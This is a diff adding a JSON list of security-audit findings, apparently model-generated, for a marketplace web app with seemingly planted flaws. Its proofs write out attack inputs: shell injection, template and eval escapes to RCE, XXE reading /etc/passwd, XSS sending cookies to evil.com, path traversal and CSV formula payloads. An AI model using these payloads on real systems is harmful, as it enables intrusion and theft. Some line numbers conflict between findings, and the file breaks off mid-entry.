@@ -1,0 +1,992 @@
+{
+  "version": "twin-distill-flash-dsonly",
+  "results": [
+    {
+      "check_id": "twin-round/CWE-78",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 115
+      },
+      "end": {
+        "line": 115
+      },
+      "extra": {
+        "message": "OS Command Injection via os.system()",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-78"
+          ],
+          "citation": "status = _os.system(\"ping -c 1 \" + host)",
+          "proof": "SOURCE: query parameter `host` (user-controlled string, default \"127.0.0.1\") -> SINK: os.system() concatenates it directly into a shell command at line 115. An attacker can send `host=127.0.0.1;id` or `host=127.0.0.1&&curl...` to execute arbitrary OS commands with the server's privileges. The INTERNAL_OPS_TOKEN gate is the only defense, but if that token is ever leaked or if an attacker gains internal network access, this is trivially exploitable for RCE."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-94",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 68
+      },
+      "end": {
+        "line": 68
+      },
+      "extra": {
+        "message": "Arbitrary Code Execution via eval()",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-94"
+          ],
+          "citation": "result = eval(expr, {\"__builtins__\": {}}, {\"amount\": 42, \"fee\": 7})",
+          "proof": "SOURCE: query parameter `expr` (user-controlled string, default \"amount + fee\") -> SINK: eval() executes it server-side at line 68. Although __builtins__ is restricted to {}, Python's eval is well-known to be bypassable (e.g., via `().__class__.__mro__[1].__subclasses__()` to reach os.system). An attacker sending `expr=().__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['system']('id')` achieves full RCE."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1336",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 102
+      },
+      "end": {
+        "line": 102
+      },
+      "extra": {
+        "message": "Server-Side Template Injection (SSTI) leading to RCE",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-1336"
+          ],
+          "citation": "body = Template(\"Result: \" + fragment).render()",
+          "proof": "SOURCE: query parameter `fragment` (user-controlled string, default \"{{ 7 * 7 }}\") -> SINK: concatenated into the template string before Jinja2 `.render()` at line 102. The user controls template syntax itself. Sending `fragment={{ ''.__class__.__mro__[2].__subclasses__()[X].__init__.__globals__['os'].system('id') }}` achieves sandbox escape and arbitrary code execution."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-611",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 129
+      },
+      "end": {
+        "line": 129
+      },
+      "extra": {
+        "message": "XXE Injection via lxml XMLParser",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-611"
+          ],
+          "citation": "parser = etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)",
+          "proof": "SOURCE: HTTP POST body (user-controlled XML) -> SINK: lxml parser configured with `load_dtd=True, resolve_entities=True, no_network=False` at line 129, and `etree.fromstring(await request.body(), parser)` at line 130. An attacker can send a crafted XML payload containing `<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> <root>&xxe;</root>` to read arbitrary server files, or `SYSTEM \"http://attacker.com/\"` for SSRF to internal networks. The `no_network=False` setting allows outbound network connections during parsing."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "app/config.py",
+      "start": {
+        "line": 8
+      },
+      "end": {
+        "line": 8
+      },
+      "extra": {
+        "message": "Hardcoded Weak Secret Key for Session Signing",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "secret_key: str = \"dev-secret-change-me\"",
+          "proof": "SOURCE: hardcoded default in Settings class at line 8 -> SINK: used by URLSafeSerializer in security.py to sign all session cookies. An attacker who knows this default key (published in source code) can forge arbitrary session cookies via `serializer().dumps({\"uid\": ANY_USER_ID})`, gaining administrative access to any account including marketplace_admin. The session cookie `vm_session` is trivially forgeable."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-284",
+      "path": "app/services.py",
+      "start": {
+        "line": 130
+      },
+      "end": {
+        "line": 130
+      },
+      "extra": {
+        "message": "Missing Access Control on Dispute Evidence Downloads (IDOR)",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-284"
+          ],
+          "citation": "if attachment.dispute_id:\n        raise_if = False\n        # Use dispute ownership to decide evidence access.\n        return",
+          "proof": "SOURCE: any authenticated user requests `/api/files/{attachment_id}` -> SINK: `assert_attachment_access()` at line 130 checks `if attachment.dispute_id:` and returns immediately at line 133 without any ownership or role verification (the variable `raise_if` is dead code). This means ANY authenticated user can download any dispute evidence file, regardless of whether they are the buyer, vendor, or support agent involved in that dispute. Combined with the `/api/files/{attachment_id}` endpoint which serves files via FileResponse, this leaks sensitive evidence to unauthorized users."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 78
+      },
+      "end": {
+        "line": 78
+      },
+      "extra": {
+        "message": "Reflected XSS via Jinja2 |safe Filter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "body = Template(\"{{ card|safe }}\").render(card=card)",
+          "proof": "SOURCE: query parameter `card` (user-controlled string, default \"<b>pending</b>\") -> SINK: rendered into HTML via Jinja2's `|safe` filter at line 78 which disables HTML escaping. An attacker can send `card=<script>alert(document.cookie)</script>` to execute arbitrary JavaScript in the browser of any operations staff who visits the link. The HTMLResponse(content_type='text/html') ensures the browser renders it as HTML."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 25
+      },
+      "end": {
+        "line": 25
+      },
+      "extra": {
+        "message": "Reflected XSS via Unsanitized HTML String Concatenation",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "body = \"<section><h2>\" + copyline + \"</h2><p>Preview generated for operations.</p></section>\"",
+          "proof": "SOURCE: query parameter `copyline` (user-controlled string, default \"payout update\") -> SINK: directly concatenated into an HTML string at line 25 and returned as HTMLResponse. No escaping of any kind. An attacker can send `copyline=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` to execute arbitrary JavaScript in the operations staff's browser."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-22",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 107
+      },
+      "end": {
+        "line": 107
+      },
+      "extra": {
+        "message": "Path Traversal in Arbitrary File Write",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-22"
+          ],
+          "citation": "target = BASE_EXPORT_DIR / name\n    target.parent.mkdir(parents=True, exist_ok=True)\n    target.write_bytes(body)",
+          "proof": "SOURCE: query parameter `name` (user-controlled string, default \"packet.bin\") -> SINK: used directly as a file path via pathlib's `/` operator at line 107. An attacker can provide `name=../../tmp/evil.sh` to write arbitrary content to arbitrary files outside the intended `private_exports/` directory. Combined with POST body that can contain shell script content, this enables arbitrary file write leading to RCE."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-22",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 61
+      },
+      "end": {
+        "line": 61
+      },
+      "extra": {
+        "message": "Path Traversal via ref Parameter in File Write",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-22"
+          ],
+          "citation": "target = BASE_EXPORT_DIR / f\"{ref}.json\"",
+          "proof": "SOURCE: query parameter `ref` (user-controlled, from `request.query_params.get(\"ref\", payload.get(\"ref\", \"daily\"))`) at line 60 -> SINK: interpolated into a file path at line 61 and written to with attacker-controlled SSN and credit card data. An attacker can provide `ref=../../etc/cron.d/evil` to write JSON data containing arbitrary SSN numbers to arbitrary locations. The `.json` extension is appended but this does not prevent path traversal."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-943",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 140
+      },
+      "end": {
+        "line": 140
+      },
+      "extra": {
+        "message": "NoSQL Injection via Unvalidated MongoDB Query Filter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-943"
+          ],
+          "citation": "query = payload.get(\"filter\", payload)\n    doc = MongoClient(os.environ.get(\"MONGO_URL\", \"mongodb://localhost:27017\")).ops.records.find_one(query)",
+          "proof": "SOURCE: HTTP POST body (user-controlled JSON) -> SINK: used directly as a MongoDB query filter object via `find_one(query)` at line 140. An attacker can send `{\"filter\": {\"$ne\": \"\"}}` or `{\"$where\": \"this.role == 'admin'\"}` to bypass intended query logic, enumerate documents, or potentially trigger server-side JavaScript execution if MongoDB is configured with `--noscripting=false`. The entire payload can be injected as the query since `payload.get(\"filter\", payload)` falls back to the raw payload."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-614",
+      "path": "app/security.py",
+      "start": {
+        "line": 42
+      },
+      "end": {
+        "line": 42
+      },
+      "extra": {
+        "message": "Session Cookie Not Marked Secure (transmitted over HTTP)",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-614"
+          ],
+          "citation": "response.set_cookie(\n        get_settings().session_cookie,\n        token,\n        httponly=True,\n        secure=False,\n        samesite=\"lax\",\n        max_age=60 * 60 * 12,\n    )",
+          "proof": "SOURCE: set_session() in security.py -> SINK: the session cookie is set with `secure=False` at line 42, meaning it will be transmitted over unencrypted HTTP connections. A network attacker can intercept the session cookie via passive eavesdropping and immediately hijack the user's session. The app has CORS configured which suggests it may be accessed over the network."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-942",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 95
+      },
+      "end": {
+        "line": 95
+      },
+      "extra": {
+        "message": "Overly Permissive CORS with Credentials Enabled",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-942"
+          ],
+          "citation": "response.headers[\"Access-Control-Allow-Credentials\"] = \"true\"",
+          "proof": "Untrusted SOURCE: HTTP Origin header from the incoming request (line 92: `request.headers.get(\"origin\", \"*\")`). SINK: echoed directly into `Access-Control-Allow-Origin` at line 93 with `Access-Control-Allow-Credentials: true` at line 95. This allows arbitrary websites to make authenticated cross-origin requests, enabling session hijacking for any victim authenticated on this marketplace."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-94",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 101
+      },
+      "end": {
+        "line": 101
+      },
+      "extra": {
+        "message": "Server-Side Template Injection via Jinja2 Fragment Concatenation",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-94"
+          ],
+          "citation": "body = Template(\"Result: \" + fragment).render()",
+          "proof": "Untrusted SOURCE: the `fragment` query parameter (line 99) accepted directly from the user with default \"{{ 7 * 7 }}\" demonstrating injection. SINK: `Template(\"Result: \" + fragment).render()` at line 101 concatenates user input into the template source. An attacker can inject Jinja2 syntax such as `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` to achieve Remote Code Execution."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "app/main.py",
+      "start": {
+        "line": 563
+      },
+      "end": {
+        "line": 563
+      },
+      "extra": {
+        "message": "Missing Authorization in Integration Order Status Update",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "order.status = status_value",
+          "proof": "SOURCE: `x-api-key` header authenticates the caller (lines 557-561) but only checks `ApiKey.is_active == True` with zero enforcement of vendor-scoping fields (`owner_id`, `role_scope`). SINK: `order.status = status_value` at line 563 modifies ANY order's status regardless of ownership. An API key created for Vendor A can modify Vendor B's orders \u2014 escalate 'placed' to 'fulfilled' to receive payment, or 'disputed' to 'refunded' to close disputes."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 52
+      },
+      "end": {
+        "line": 52
+      },
+      "extra": {
+        "message": "Authorization Header Leaked to Application Logs",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "logger.warning(\"ops tally body=%s bearer=%s\", body, request.headers.get(\"authorization\"))",
+          "proof": "Untrusted SOURCE: `request.headers.get(\"authorization\")` contains the raw Bearer token from the incoming HTTP request. SINK: `logger.warning()` at line 52 writes it verbatim to the application log stream. Any attacker who gains read access to logs can extract bearer tokens and impersonate callers across any endpoint."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-338",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 122
+      },
+      "end": {
+        "line": 122
+      },
+      "extra": {
+        "message": "Non-Cryptographic PRNG Used for Nonce Generation",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-338"
+          ],
+          "citation": "code = \"\".join(random.choice(alphabet) for _ in range(length))",
+          "proof": "SOURCE: the `random` module (Mersenne Twister, predictable PRNG) used instead of `secrets`. SINK: the generated `code` returned at line 123 in the HTTP response body as a nonce. An attacker observing a sequence of nonces can recover the PRNG state and predict future values, defeating replay protection or CSRF mitigation."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 135
+      },
+      "end": {
+        "line": 135
+      },
+      "extra": {
+        "message": "Environment Variable and Internal Path Exposed via Trace Endpoint",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "return {\"trace\": trace_on, \"module\": os.environ.get(\"APP_ENV\"), \"base\": str(BASE_EXPORT_DIR)}",
+          "proof": "SOURCE: `os.environ.get(\"APP_ENV\")` reads the deployment environment, and `str(BASE_EXPORT_DIR)` resolves the server-side export directory path. SINK: both returned directly in the JSON response at line 135, revealing whether the server is production/staging/dev and the absolute file path for exports, enabling targeted attacks."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 83
+      },
+      "end": {
+        "line": 83
+      },
+      "extra": {
+        "message": "Hardcoded Shared Secrets for Identity Verification",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "known = {\"north\": \"4812\", \"south\": \"5930\"}",
+          "proof": "SOURCE: static dictionary literal hardcoded at line 83. SINK: used at lines 85-86 as the sole authority: `if verifier != known[handle]: return 403`. Anyone who can read the source code (developers, CI logs, leaked repo) knows all handle/verifier pairs. The 4-digit numeric verifiers (4812, 5930) are also trivially brute-forced once handles 'north'/'south' are known."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "app/main.py",
+      "start": {
+        "line": 478
+      },
+      "end": {
+        "line": 478
+      },
+      "extra": {
+        "message": "No File Size Validation in CSV Product Import (Memory Exhaustion DoS)",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "text = file.file.read().decode(\"utf-8\")",
+          "proof": "Untrusted SOURCE: `file: UploadFile = File(...)` \u2014 the incoming multipart upload is entirely user-controlled. SINK: `file.file.read()` at line 478 reads the entire payload into memory with no size check. Compare with `store_upload()` in services.py which enforces a 5MB limit. An attacker registered as a vendor_manager can upload a multi-gigabyte CSV, exhausting server RAM and causing denial of service."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-362",
+      "path": "app/main.py",
+      "start": {
+        "line": 208
+      },
+      "end": {
+        "line": 208
+      },
+      "extra": {
+        "message": "Race Condition in Checkout Inventory Deduction (Overselling)",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-362"
+          ],
+          "citation": "product.inventory -= payload.quantity",
+          "proof": "SOURCE: two concurrent POST /api/checkout requests for the same product. SINK: line 206 checks `if product.inventory < payload.quantity`, then line 208 performs `product.inventory -= payload.quantity` \u2014 a classic TOCTOU race. At default READ COMMITTED isolation with no SELECT...FOR UPDATE or optimistic locking, concurrent requests both see the old inventory, both pass the check, and both subtract. The second write silently overwrites the first, allowing inventory to go negative or a single unit to be sold to multiple buyers."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-916",
+      "path": "app/security.py",
+      "start": {
+        "line": 83
+      },
+      "end": {
+        "line": 83
+      },
+      "extra": {
+        "message": "Unsalted SHA256 Used for API Key Hashing (Rainbow-Table Susceptible)",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-916"
+          ],
+          "citation": "return hashlib.sha256(raw.encode()).hexdigest()",
+          "proof": "SOURCE: the raw API key string (e.g. 'vmk_<30-urlsafe-bytes>') generated by `make_api_key()` at security.py:76. SINK: `hash_api_key()` at line 83 applies plain SHA256 with no salt and no iteration count. If the api_keys table is exfiltrated via SQLi or backup leak, an attacker can precompute rainbow tables for the known 'vmk_' prefix and reverse hashes offline at high speed, recovering live API keys that bypass authentication on `/api/integrations/order-status`."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-312",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 62
+      },
+      "end": {
+        "line": 62
+      },
+      "extra": {
+        "message": "Cleartext Storage of PII (SSN and Credit Card Numbers) on Filesystem",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-312"
+          ],
+          "citation": "target.write_text(json.dumps({\"ref\": ref, \"ssn\": payload.get(\"ssn\", \"111-22-3333\"), \"card\": payload.get(\"card\", \"4111111111111111\")}))",
+          "proof": "The /ops/vault/seller-stash-237 endpoint receives user-supplied JSON containing ssn and card fields (SOURCE: untrusted user input via request.json()). These values are serialized with json.dumps() and written directly to a file at a predictable path via target.write_text() (SINK: filesystem). Sensitive personally identifiable information is stored without encryption on the server filesystem, violating data protection requirements. Protected only by a gate token which does not encrypt the data at rest."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "app/main.py",
+      "start": {
+        "line": 559
+      },
+      "end": {
+        "line": 559
+      },
+      "extra": {
+        "message": "Missing API Key Scope Enforcement \u2014 Any Valid API Key Can Update Any Order",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "key = db.scalar(select(ApiKey).where(and_(ApiKey.key_hash == hash_api_key(raw), ApiKey.is_active == True)))",
+          "proof": "The integration endpoint /api/integrations/order-status authenticates callers via the x-api-key header (SOURCE: untrusted HTTP header). The lookup query on line 559 only validates that the key exists and is_active==True, but never checks the ApiKey.role_scope field. As a result, ANY valid API key \u2014 regardless of its intended scope \u2014 can mutate any order's status via order.status = status_value on line 567 (SINK: unauthorized state change). This is a missing authorization enforcement that bypasses the role_scope mechanism entirely."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1236",
+      "path": "app/services.py",
+      "start": {
+        "line": 230
+      },
+      "end": {
+        "line": 230
+      },
+      "extra": {
+        "message": "CSV Formula Injection via Unsanitized DictWriter Output",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-1236"
+          ],
+          "citation": "writer.writerow({f: row.get(f, \"\") for f in fields})",
+          "proof": "The csv_response() function writes rows to CSV using csv.DictWriter without sanitizing cells that start with formula-trigger characters (=, +, -, @). Data flows from database-stored values such as vendor names and product names (SOURCE: user-controllable fields populated via product/review creation endpoints) through the /api/export/{kind} endpoint into writer.writerow() (SINK: CSV output). If an attacker creates a product with a name like '=cmd|\\'/C calc\\'!A0' and an admin opens the exported CSV in Excel/LibreOffice, the formula executes, enabling arbitrary command execution on the admin's machine."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "app/main.py",
+      "start": {
+        "line": 56
+      },
+      "end": {
+        "line": 56
+      },
+      "extra": {
+        "message": "Missing Rate Limiting on Authentication Endpoints",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "@app.post(\"/api/login\")\ndef login(payload: LoginIn, response: Response, db: Session = Depends(get_db)):",
+          "proof": "The /api/login (line 56), /api/register (line 23), and /api/password-reset (line 73) endpoints have no rate-limiting middleware, decorator, or throttle check. An attacker can send unlimited requests from a single IP to brute-force passwords (login), mass-create accounts (register), or spam password-reset tokens. The request objects reach the handler unconstrained, enabling automated credential stuffing and enumeration attacks."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "scripts/seed.py",
+      "start": {
+        "line": 16
+      },
+      "end": {
+        "line": 16
+      },
+      "extra": {
+        "message": "Hardcoded Demo Password for All Seed Accounts",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "PASSWORD = \"Password123!\"",
+          "proof": "The constant PASSWORD (line 16) is hardcoded as \"Password123!\" and every demo user \u2014 admin, support, vendor, buyer \u2014 is created with this same weak password via hash_password(PASSWORD). If the seed script is run against a non-isolated database, all accounts are trivially compromised. The password is also printed to stdout at the end of seeding, exposing it further."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "docker-compose.yml",
+      "start": {
+        "line": 6
+      },
+      "end": {
+        "line": 6
+      },
+      "extra": {
+        "message": "Default Weak Database Password in Docker-Compose",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "POSTGRES_PASSWORD: postgres",
+          "proof": "The PostgreSQL service in docker-compose.yml sets the superuser password to the well-known default \"postgres\". The service is exposed on port 55439 externally (mapped from 5432). Any attacker who gains network access to port 55439 can connect with the widely-known credentials and read/write the entire vendor marketplace database, including PII, financial records, and audit logs."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "app/main.py",
+      "start": {
+        "line": 78
+      },
+      "end": {
+        "line": 78
+      },
+      "extra": {
+        "message": "Sensitive Password-Reset Token Leaked to Audit Logs",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "audit(db, user, \"password_reset_requested\", \"user\", user.id, {\"mock_email_token\": user.password_reset_token[:8]})",
+          "proof": "When a password reset is requested, the first 8 characters of the cryptographically-generated reset token are written to the AuditLog table as part of the audit entry details. Anyone with access to the audit log (marketplace admin, or via a separate data leak) can see these truncated tokens. This reduces the effective entropy of the 32-byte token from 256 bits to 64 bits for the exposed prefix, enabling partial token prediction and significantly narrowing brute-force targets."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 32
+      },
+      "end": {
+        "line": 32
+      },
+      "extra": {
+        "message": "Mass Assignment via User-Controlled JSON Merged into Workset",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "workset.update(change_set)",
+          "proof": "The /ops/workset/seller-meter-roll-053 endpoint receives attacker-controlled JSON (change_set = await request.json()) and merges it directly into a pre-defined workset dict via dict.update(). The workset contains privileged keys: role, is_admin, credit_limit. An attacker can send {\"role\": \"admin\", \"is_admin\": true, \"credit_limit\": 999999} to escalate privileges and override financial limits, because no field allowlist or schema validation is applied before the merge. Protected only by a gate token."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-754",
+      "path": "app/main.py",
+      "start": {
+        "line": 234
+      },
+      "end": {
+        "line": 234
+      },
+      "extra": {
+        "message": "Unhandled ValueError in User-Supplied Date Parsing Leading to 500 Error",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-754"
+          ],
+          "citation": "filters.append(Order.created_at >= datetime.fromisoformat(date_from))",
+          "proof": "The date_from and date_to query parameters are passed directly to datetime.fromisoformat() without a try/except block. An attacker can send a non-ISO-format string such as date_from=not-a-date, causing ValueError to propagate as an unhandled exception. FastAPI's default error handler returns a 500 Internal Server Error. In environments with debug tracebacks enabled (or if this leaks into monitoring/error-reporting), this reveals internal path and state information. Repeated requests constitute a trivial DoS vector."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "app/main.py",
+      "start": {
+        "line": 56
+      },
+      "end": {
+        "line": 56
+      },
+      "extra": {
+        "message": "Missing CSRF Protection on All State-Changing Routes",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "@app.post(\"/api/login\")\ndef login(payload: LoginIn, response: Response, db: Session = Depends(get_db)):\n    user = db.scalar(select(User).where(User.email == payload.email))\n    if not user or not verify_password(payload.password, user.password_hash) or not user.is_active:\n        raise HTTPException(status_code=401, detail=\"Invalid credentials\")\n    set_session(response, user.id)",
+          "proof": "The application uses cookie-based session authentication (vm_session cookie with httponly=True, samesite='lax') but has zero CSRF protection \u2014 no CSRF middleware, no CSRF tokens, no Origin/Referer header validation. SameSite=Lax does not protect against all CSRF scenarios (e.g., same-site subdomains, form submissions from GET-triggered redirects, or browsers that don't enforce SameSite). Every state-changing route (POST /api/checkout, PUT /api/me, PUT /api/admin/users/{user_id}, POST /api/api-keys, and over 15 others) is vulnerable. An attacker can forge requests that place orders, modify user profiles, change roles, or create API keys using the victim's authenticated session."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "app/main.py",
+      "start": {
+        "line": 73
+      },
+      "end": {
+        "line": 73
+      },
+      "extra": {
+        "message": "No Rate Limiting on Password Reset Endpoint (Enumeration + Abuse)",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "@app.post(\"/api/password-reset\")\ndef password_reset(email: str, db: Session = Depends(get_db)):",
+          "proof": "The POST /api/password-reset endpoint has no rate limiting. Although the response is intentionally ambiguous ('If the account exists...'), an attacker can send unlimited requests to: (a) enumerate valid emails via side-channels like response timing or database load patterns, and (b) flood the system generating password_reset_token writes and audit log entries for every request, creating a denial-of-service and log-spam vector."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "app/main.py",
+      "start": {
+        "line": 34
+      },
+      "end": {
+        "line": 34
+      },
+      "extra": {
+        "message": "No Rate Limiting on Registration Endpoint (Automated Account Creation)",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "def register(payload: RegisterIn, response: Response, db: Session = Depends(get_db)):",
+          "proof": "The POST /api/register endpoint has no rate limiting, CAPTCHA, or email verification. An attacker can programmatically create unlimited buyer and vendor accounts, flooding the database with junk data. There is no IP-based throttling or any other abuse prevention mechanism."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "app/seller_operations.py",
+      "start": {
+        "line": 46
+      },
+      "end": {
+        "line": 46
+      },
+      "extra": {
+        "message": "Mass Assignment: User-Controlled Ledger State Overwrite",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "ledger[\"state\"] = payload.get(\"state\", \"approved\")",
+          "proof": "The ledger dict's 'state' field is set directly from user-supplied JSON via payload.get('state', 'approved'). The 'amount' is also user-controlled and directly modifies ledger['balance'] via subtraction without any bounds checking beyond int() conversion. Although behind an INTERNAL_OPS_TOKEN gate (shared-secret), anyone with the token can arbitrarily set the ledger state to any value."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "app/security.py",
+      "start": {
+        "line": 27
+      },
+      "end": {
+        "line": 27
+      },
+      "extra": {
+        "message": "No Server-Side Session Invalidation \u2014 Stolen Cookies Remain Valid for 12 Hours",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "def set_session(response: Response, user_id: int) -> None:\n    token = serializer().dumps({\"uid\": user_id, \"iat\": datetime.utcnow().isoformat()})\n    response.set_cookie(\n        get_settings().session_cookie,\n        token,\n        httponly=True,\n        secure=False,\n        samesite=\"lax\",\n        max_age=60 * 60 * 12,\n    )",
+          "proof": "Sessions are purely client-side signed tokens (via itsdangerous URLSafeSerializer) with no server-side session store, blacklist, or version counter. The logout endpoint (clear_session at line 39) only deletes the cookie from the browser; the underlying token remains cryptographically valid for its full 12-hour max_age. A stolen or leaked session cookie continues to work even after logout or password change \u2014 there is no mechanism to revoke it."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-204",
+      "path": "app/main.py",
+      "start": {
+        "line": 38
+      },
+      "end": {
+        "line": 38
+      },
+      "extra": {
+        "message": "User Enumeration via Registration Endpoint",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-204"
+          ],
+          "citation": "raise HTTPException(status_code=400, detail=\"Email already registered\")",
+          "proof": "SOURCE: User-supplied `email` in request body -> SINK: `db.scalar(select(User).where(User.email == payload.email))` returns a distinct HTTP 400 response ('Email already registered') when the email exists vs a 200/201 when it does not. An unauthenticated attacker can enumerate valid registered emails by observing the distinct error message, without rate limiting."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-434",
+      "path": "app/services.py",
+      "start": {
+        "line": 216
+      },
+      "end": {
+        "line": 216
+      },
+      "extra": {
+        "message": "Unrestricted File Upload with Client-Controlled Content-Type (Stored XSS)",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-434"
+          ],
+          "citation": "content_type=upload.content_type or \"application/octet-stream\",",
+          "proof": "SOURCE: `upload.content_type` (HTTP Content-Type header from the upload client) -> SINK: stored verbatim in `Attachment.content_type` at services.py:216. No MIME validation, magic-byte inspection, or content verification occurs. The file bytes are written to disk as-is. In download_file (main.py:410), `FileResponse(path, media_type=att.content_type, ...)` serves the file with the attacker-controlled media_type. An attacker uploads a file with Content-Type: text/html containing <script> payload; when downloaded, the browser renders it as HTML executing the script (stored XSS with the origin's authority)."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-434",
+      "path": "app/main.py",
+      "start": {
+        "line": 410
+      },
+      "end": {
+        "line": 410
+      },
+      "extra": {
+        "message": "File Served with Attacker-Controlled Media Type (Stored XSS Delivery)",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-434"
+          ],
